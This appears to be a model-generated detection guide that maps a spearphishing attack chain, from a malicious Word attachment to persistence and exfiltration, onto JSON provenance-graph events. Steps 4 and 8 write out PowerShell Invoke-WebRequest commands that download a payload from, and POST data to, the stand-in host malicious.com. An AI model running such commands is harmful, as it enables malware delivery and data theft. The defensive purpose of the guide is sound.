<output>
1. **Identify Email Delivery via Spearphishing**  
   - Monitor for events where the `srcNode` is an email application (e.g., Outlook) and the `dstNode` is an email with a suspicious "From" address (e.g., "admin@fakecompany.com") and an attachment named "Invoice_2023.docx".  
   - Set the `relation` to "Process Create" for the email application process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Name": "Outlook",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "Invoice_2023.docx",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```

2. **Identify User Interaction with Malicious Attachment**  
   - Monitor for events where the `srcNode` is the Outlook process and the `dstNode` is the attachment being opened.  
   - Set the `relation` to "Process Create" for the Outlook process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Name": "Outlook",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "Invoice_2023.docx",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```

3. **Identify Execution of Malicious Macro**  
   - Monitor for events where the `srcNode` is Microsoft Word and the `dstNode` is a script or process spawned by Word.  
   - Set the `relation` to "Process Create" for the Word process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         "Type": "Process"
       },
       "dstNode": {
         "Image": "C:\\Windows\\System32\\cmd.exe",
         "Type": "Process"
       },
       "relation": "Process Create"
     }
     ```

4. **Identify Payload Download via PowerShell**  
   - Monitor for events where the `srcNode` is PowerShell and the `dstNode` is a command that downloads an executable from a suspicious URL.  
   - Set the `relation` to "Process Create" for the PowerShell process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "payload.exe",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```

5. **Identify Execution of Malicious Payload**  
   - Monitor for events where the `srcNode` is the Windows Command Prompt and the `dstNode` is the downloaded payload being executed.  
   - Set the `relation` to "Process Create" for the Command Prompt process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\cmd.exe",
         "Cmdline": "C:\\Users\\User\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Name": "payload.exe",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```

6. **Identify Registry Modification for Persistence**  
   - Monitor for events where the `srcNode` is the Registry Editor and the `dstNode` is the registry key being modified for persistence.  
   - Set the `relation` to "RegSetValue" for the Registry Editor process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\regedit.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MaliciousApp",
         "Type": "Registry"
       },
       "relation": "RegSetValue"
     }
     ```

7. **Identify Command and Control Communication**  
   - Monitor for events where the `srcNode` is PowerShell and the `dstNode` is a network connection to a command and control server.  
   - Set the `relation` to "TCP Connect" for the PowerShell process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "malicious.com",
         "Port": 80,
         "Type": "Network"
       },
       "relation": "TCP Connect"
     }
     ```

8. **Identify Data Exfiltration via PowerShell**  
   - Monitor for events where the `srcNode` is PowerShell and the `dstNode` is a command that sends sensitive data to an external server.  
   - Set the `relation` to "Process Create" for the PowerShell process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "malicious.com",
         "Port": 80,
         "Type": "Network"
       },
       "relation": "TCP Send"
     }
     ```
</output>